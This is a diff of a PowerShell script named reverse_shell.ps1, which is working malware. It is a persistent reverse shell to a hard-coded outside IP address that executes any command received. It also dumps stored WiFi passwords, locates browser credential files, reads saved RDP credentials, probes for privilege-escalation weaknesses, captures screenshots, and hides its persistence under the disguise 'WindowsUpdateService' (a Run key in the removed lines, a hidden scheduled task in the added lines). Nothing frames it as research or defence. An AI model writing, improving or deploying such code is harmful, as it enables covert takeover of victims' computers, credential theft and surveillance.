@@ -1,156 +1,128 @@
-# reverse_shell.ps1 - Advanced persistent reverse shell with credential dumping
+# reverse_shell.ps1 - Persistent reverse shell with advanced features
 $serverIP = "147.185.221.31"  # ← UPDATE WITH YOUR ARCH IP
 $serverPort = 47034
 $reconnectDelay = 15  # Seconds to wait before reconnecting
 $localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
 
-# Ensure the script persists itself
-if (-not (Test-Path $localPayloadPath)) {
-    Copy-Item $MyInvocation.MyCommand.Definition $localPayloadPath
-}
-
-# Add to startup if not already present
-$startupRegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "WindowsUpdateService"
-if (-not (Get-ItemProperty -Path $startupRegPath -Name $regName -ErrorAction SilentlyContinue)) {
-    Set-ItemProperty -Path $startupRegPath -Name $regName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""
-}
-
+# Function to get detailed system information
 function Get-SystemInfo {
     $hostname = $env:COMPUTERNAME
     $username = $env:USERNAME
     $os = (Get-WmiObject Win32_OperatingSystem).Caption
-    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    return "SYSINFO:$hostname|$username|$os|Admin:$isAdmin"
+    $domain = (Get-WmiObject Win32_ComputerSystem).Domain
+    $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
+    $antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName
+    return "SYSINFO:$hostname|$username|$os|$domain|$ipAddress|$antivirus"
 }
 
-function Invoke-WifiDump {
-    # Extract WiFi passwords using netsh
+# Function to dump WiFi passwords
+function Get-WifiPasswords {
     $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
-    
     $results = @()
+    
     foreach ($profile in $wifiProfiles) {
         $profileInfo = netsh wlan show profile name="$profile" key=clear
-        $password = ($profileInfo | Select-String "Key Content") -replace "Key Content", "" -replace ":", "" -replace " ", ""
-        
-        if ($password) {
-            $results += "WiFi: $profile | Password: $password"
-        }
+        $password = ($profileInfo | Select-String "Key Content").ToString().Split(":")[1].Trim()
+        $results += "WIFI:$profile|$password"
     }
     
     return $results -join "`n"
 }
 
-function Invoke-BrowserCredDump {
-    # Attempt to extract browser credentials
+# Function to dump browser credentials (Chrome)
+function Get-BrowserCredentials {
     $results = @()
     
-    # Chrome credentials
-    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-    if (Test-Path $chromePath) {
-        $results += "Chrome credentials found at: $chromePath"
-    }
-    
-    # Firefox credentials
-    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    if (Test-Path $firefoxPath) {
-        $profiles = Get-ChildItem $firefoxPath -Directory | Where-Object { $_.Name -match "default" }
-        foreach ($profile in $profiles) {
-            $loginFile = Join-Path $profile.FullName "logins.json"
-            $keyFile = Join-Path $profile.FullName "key4.db"
-            if (Test-Path $loginFile) { $results += "Firefox logins found: $loginFile" }
-            if (Test-Path $keyFile) { $results += "Firefox key file found: $keyFile" }
-        }
-    }
-    
-    # Edge credentials
-    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-    if (Test-Path $edgePath) {
-        $results += "Edge credentials found at: $edgePath"
-    }
-    
-    if (-not $results) { return "No browser credentials found" }
-    return $results -join "`n"
-}
-
-function Invoke-CredentialDump {
-    # Comprehensive credential dumping
-    $results = @()
-    
-    # Recent run commands
-    $recentCommands = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue
-    if ($recentCommands) {
-        $results += "Recent commands: " + ($recentCommands.PSObject.Properties | Where-Object { $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSDrive" -and $_.Name -ne "PSProvider" } | ForEach-Object { $_.Name + "=" + $_.Value }) -join ", "
-    }
-    
-    # Saved RDP credentials
-    $rdpCredentials = cmdkey /list
-    if ($rdpCredentials) {
-        $results += "RDP credentials: `n" + ($rdpCredentials -join "`n")
-    }
-    
-    # Browser history (simplified)
-    $browserHistory = @()
     try {
-        # Chrome history
-        $chromeHistoryPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
-        if (Test-Path $chromeHistoryPath) {
-            $browserHistory += "Chrome history available"
+        # Chrome credentials path
+        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromePath) {
+            # This is a simplified approach - real implementation would require SQLite and decryption
+            $results += "CHROME:Credentials found at $chromePath (decryption required)"
         }
-    } catch {}
-    
-    if ($browserHistory) {
-        $results += "Browser history: `n" + ($browserHistory -join "`n")
-    }
-    
-    if (-not $results) { return "No additional credentials found" }
-    return $results -join "`n`n"
+    } catch { }
+
+    return $results -join "`n"
 }
 
-function Invoke-SystemRecon {
-    # System reconnaissance
-    $results = @()
-    
-    # Network information
-    $ipConfig = ipconfig /all
-    $results += "Network information: `n$ipConfig"
-    
-    # Running processes
-    $processes = tasklist
-    $results += "Running processes: `n$processes"
-    
-    # Installed software
-    $software = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion
-    $results += "Installed software: `n$($software | Out-String)"
-    
-    return $results -join "`n`n"
-}
-
-function Invoke-PrivEscCheck {
-    # Basic privilege escalation checks
+# Function to check for privilege escalation vectors
+function Get-PrivEscVectors {
     $results = @()
     
     # Check for unquoted service paths
     $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' }
-    if ($services) {
-        $results += "Unquoted service paths found: `n$($services | Select-Object Name, PathName | Out-String)"
+    foreach ($service in $services) {
+        $results += "PRIVESC:Unquoted service path - $($service.Name): $($service.PathName)"
     }
     
     # Check for always install elevated
-    $alwaysInstallElevated = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue) -or
-                            (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue)
-    if ($alwaysInstallElevated) {
-        $results += "AlwaysInstallElevated is enabled"
+    $alwaysInstallElevated = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
+    if ($alwaysInstallElevated -eq 1) {
+        $results += "PRIVESC:AlwaysInstallElevated enabled"
     }
     
-    # Check for vulnerable services
-    $vulnServices = Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -eq "LocalSystem" -and $_.PathName -like "*.exe*" }
-    if ($vulnServices) {
-        $results += "Services running as SYSTEM: `n$($vulnServices | Select-Object Name, PathName | Out-String)"
+    return $results -join "`n"
+}
+
+# Function to establish persistence
+function Set-Persistence {
+    try {
+        # Copy self to persistent location
+        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $localPayloadPath -Force
+        
+        # Create scheduled task for persistence
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+        Register-ScheduledTask -TaskName "WindowsUpdateService" -InputObject $task -Force
+        
+        return "PERSISTENCE:Scheduled task created successfully"
+    } catch {
+        return "PERSISTENCE:Error - $($_.Exception.Message)"
     }
+}
+
+# Function to take a screenshot
+function Get-Screenshot {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        
+        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
+        
+        $memoryStream = New-Object System.IO.MemoryStream
+        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+        $bytes = $memoryStream.ToArray()
+        $base64 = [Convert]::ToBase64String($bytes)
+        
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        $memoryStream.Dispose()
+        
+        return "SCREENSHOT:$base64"
+    } catch {
+        return "SCREENSHOT:Error - $($_.Exception.Message)"
+    }
+}
+
+# Function to handle special commands
+function Invoke-SpecialCommand {
+    param($Command)
     
-    if (-not $results) { return "No obvious privilege escalation vectors found" }
-    return $results -join "`n`n"
+    switch -Regex ($Command) {
+        "^!wifi" { return Get-WifiPasswords }
+        "^!browsers" { return Get-BrowserCredentials }
+        "^!privesc" { return Get-PrivEscVectors }
+        "^!persist" { return Set-Persistence }
+        "^!screenshot" { return Get-Screenshot }
+        "^!sysinfo" { return Get-SystemInfo }
+        default { return "ERROR:Unknown special command" }
+    }
 }
 
 # Main persistent loop (NEVER EXITS)
@@ -164,10 +136,10 @@ while ($true) {
         $writer.AutoFlush = $true
         $reader = New-Object System.IO.StreamReader($stream)
         
-        # Send system info
+        # Send system info upon connection
         $writer.WriteLine((Get-SystemInfo))
         
-        # Command execution loop (NEVER EXITS ON ERROR)
+        # Command execution loop
         while ($true) {
             try {
                 $command = $reader.ReadLine()
@@ -175,42 +147,21 @@ while ($true) {
                 
                 if ($command -eq "exit") { break }
                 
-                # Handle special commands
-                if ($command -eq "!wifi") {
-                    $result = Invoke-WifiDump
-                    $writer.Write($result)
+                # Check if it's a special command
+                if ($command -match "^!") {
+                    $result = Invoke-SpecialCommand $command
+                    $writer.WriteLine($result)
+                    continue
                 }
-                elseif ($command -eq "!browsers") {
-                    $result = Invoke-BrowserCredDump
-                    $writer.Write($result)
-                }
-                elseif ($command -eq "!creds") {
-                    $result = Invoke-CredentialDump
-                    $writer.Write($result)
-                }
-                elseif ($command -eq "!recon") {
-                    $result = Invoke-SystemRecon
-                    $writer.Write($result)
-                }
-                elseif ($command -eq "!privesc") {
-                    $result = Invoke-PrivEscCheck
-                    $writer.Write($result)
-                }
-                else {
-                    # Execute regular command (NEVER FAILS THE CONNECTION)
-                    try {
-                        $result = iex $command 2>&1 | Out-String
-                    }
-                    catch {
-                        $result = "ERROR: $($_.Exception.Message)`n"
-                    }
-                    $writer.Write($result)
-                }
+                
+                # Execute regular command
+                $result = iex $command 2>&1 | Out-String
+                $writer.WriteLine($result)
             }
             catch {
                 # Send error but KEEP CONNECTION ALIVE
                 $errorOutput = "ERROR: $($_.Exception.Message)`n"
-                $writer.Write($errorOutput)
+                $writer.WriteLine($errorOutput)
             }
         }
     }
